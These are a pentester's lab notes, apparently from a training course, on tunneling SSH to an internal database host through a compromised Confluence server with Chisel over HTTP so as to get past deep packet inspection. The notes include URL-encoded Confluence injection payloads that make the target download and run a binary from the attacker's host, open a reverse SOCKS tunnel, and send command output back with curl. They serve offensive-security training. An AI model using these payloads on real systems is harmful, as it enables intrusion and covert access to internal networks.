Bypassing Deep Packet Inspection by performing HTTP tunneling with Chisel

### HTTP Tunneling Fundies

#### Scenario
- Initial Access to CONFLUENCE01
- _Deep Packet Inspection_ (DPI) terminates all outbound traffic except HTTP
- All inbound ports blocked except 8090
- We have credentials for PGDATABASE01
_Problem_
- How to SSH to PGDATABASE01 through CONFLUENCE01
- How to tunnel to internal network and resemble outgoing HTTP connection from CONFLUENCE01
_Solution_
- HTTP Tunneling with Chisel

### HTTP Tunneling with Chisel
- Chisel Server on Kali (LPORT: 1080)
	- Binds SOCKS proxy port
	- Sends our ish through HTTP tunnel (ssh-encrypted)
- Chisel client on CONFLUENCE01
	- decapsulate our ish and push to where we want

Fortunately CONFLUENCE01 and Kali both _amd64_ Linux machines.
Can use the same #chisel binary 

Transfer chisel binary to CONFLUENCE01 through Kali's #apache2server

Copying the Chisel binary to the Apache2 server folder

```
kali@kali:~$ sudo cp $(which chisel) /var/www/html/
```

Starting Apache2

```
kali@kali:~$ sudo systemctl start apache2
```

Wget payload we use to download the Chisel binary to /tmp/chisel on CONFLUENCE01 and make it executable

```
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

Wget payload executed within our cURL Confluence injection command

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

Starting the Chisel server on port 8080

```hlt:1,4
kali@kali:~$ chisel server --port 8080 --reverse
2023/10/03 15:57:53 server: Reverse tunnelling enabled
2023/10/03 15:57:53 server: Fingerprint Pru+AFGOUxnEXyK1Z14RMqeiTaCdmX6j4zsa9S2Lx7c=
2023/10/03 15:57:53 server: Listening on http://0.0.0.0:8080
```

Starting tcpdump to listen on TCP/8080 through the tun0 interface

```
kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080
```

Start the Chisel client using the curl injection

- Kali machine (**192.168.118.4:8080**)

The Chisel client command we run from the web shell

```
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```

 Starting the Chisel client using the Confluence injection payload

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

There is an error. Constructing the following payload to send through curl in order to see the error output:

```
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
```

The error-collecting-and-sending injection payload

``` 
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/
```

Tcpdump is showing this error

```
        /tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/chisel) [|http]
```

Chisel is trying to use glibc versions 2.32 and 2.34. CONFLUENCE01 doesn't have.

Troubleshooting... 

Checking Chisel version on Kali

```hlt:1,5
kali@kali:~$ chisel -h

  Usage: chisel [command] [--help]

  Version: 1.8.1-0kali2 (go1.20.7)
```

Go version 1.20 creates this incompatibility. 

Download different version of Chisel from GitHub that is compiled with Go 1.19

```
kali@kali:~$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
```

Unpack with #gunzip

```
kali@kali:~$ gunzip chisel_1.8.1_linux_amd64.gz
```

Copy to Apache web root 

```
kali@kali:~$ sudo cp ./chisel /var/www/html   
```

Re-run wget injection to force CONFLUENCE01 to download new Chisel binary 

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

Start the Chisel client using the Confluence injection payload, again

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

Viewing tcpdump session to see inbound chisel traffic

```hlt:1,6-13

```

Chisel server also logs connecc

```
kali@kali:~$ chisel server --port 8080 --reverse
```

Ensure SOCKS proxy is open on port 1080

```hlt:1,4
kali@kali:~$ ss -ntplu
Netid     State      Recv-Q     Send-Q           Local Address:Port            Peer Address:Port     Process
udp       UNCONN     0          0                      0.0.0.0:34877                0.0.0.0:*
tcp       LISTEN     0          4096                 127.0.0.1:1080                 0.0.0.0:*         users:(("chisel",pid=501221,fd=8))
```

Use this to connect to PGDATABASE01.

Need to install and use #Ncat to connect to SOCKS proxy with _Proxy Command_

Installing Ncat with apt

```
kali@kali:~$ sudo apt install ncat
```

Successful SSH connection to PGDATABASE01 through our Chisel HTTP tunnel

```hlt:1,16
